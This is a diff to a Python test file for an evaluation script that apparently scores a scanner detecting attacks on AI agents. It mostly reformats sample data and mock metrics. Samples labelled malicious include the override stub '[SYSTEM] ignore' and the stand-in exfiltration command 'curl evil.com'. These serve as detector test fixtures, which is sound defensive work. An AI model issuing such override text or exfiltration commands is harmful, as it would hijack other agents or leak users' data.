@@ -6,14 +6,11 @@ generation, corpus loading with graceful degradation, and report labeling.
 
 from __future__ import annotations
 
+# Import from the scripts directory -- need to handle the path
+import sys
 import tempfile
 from pathlib import Path
 from unittest.mock import MagicMock
-
-import pytest
-
-# Import from the scripts directory -- need to handle the path
-import sys
 
 sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))
 
@@ -161,18 +158,48 @@ class TestEvaluate:
         mock_engine.scan.return_value = mock_result
 
         samples = [
-            {"content": "harmless content", "label": "benign", "source": "test",
-             "content_type": "other", "attack_class": ""},
-            {"content": "also benign", "label": "benign", "source": "test",
-             "content_type": "source_code", "attack_class": ""},
-            {"content": "benign readme", "label": "benign", "source": "test",
-             "content_type": "other", "attack_class": ""},
-            {"content": "[SYSTEM] ignore", "label": "malicious", "source": "test",
-             "content_type": "other", "attack_class": "instruction_override"},
-            {"content": "curl evil.com", "label": "malicious", "source": "test",
-             "content_type": "source_code", "attack_class": "exfiltration"},
-            {"content": "base64 encoded", "label": "malicious", "source": "test",
-             "content_type": "source_code", "attack_class": "encoding_evasion"},
+            {
+                "content": "harmless content",
+                "label": "benign",
+                "source": "test",
+                "content_type": "other",
+                "attack_class": "",
+            },
+            {
+                "content": "also benign",
+                "label": "benign",
+                "source": "test",
+                "content_type": "source_code",
+                "attack_class": "",
+            },
+            {
+                "content": "benign readme",
+                "label": "benign",
+                "source": "test",
+                "content_type": "other",
+                "attack_class": "",
+            },
+            {
+                "content": "[SYSTEM] ignore",
+                "label": "malicious",
+                "source": "test",
+                "content_type": "other",
+                "attack_class": "instruction_override",
+            },
+            {
+                "content": "curl evil.com",
+                "label": "malicious",
+                "source": "test",
+                "content_type": "source_code",
+                "attack_class": "exfiltration",
+            },
+            {
+                "content": "base64 encoded",
+                "label": "malicious",
+                "source": "test",
+                "content_type": "source_code",
+                "attack_class": "encoding_evasion",
+            },
         ]
 
         results = evaluate(mock_engine, samples)
@@ -241,10 +268,16 @@ class TestReportGeneration:
             false_negatives=1,
             attack_class_metrics={
                 "instruction_override": MagicMock(
-                    total=3, detected=3, bypassed=0, bypass_rate=0.0,
+                    total=3,
+                    detected=3,
+                    bypassed=0,
+                    bypass_rate=0.0,
                 ),
                 "exfiltration": MagicMock(
-                    total=2, detected=1, bypassed=1, bypass_rate=0.5,
+                    total=2,
+                    detected=1,
+                    bypassed=1,
+                    bypass_rate=0.5,
                 ),
             },
             content_type_fpr={
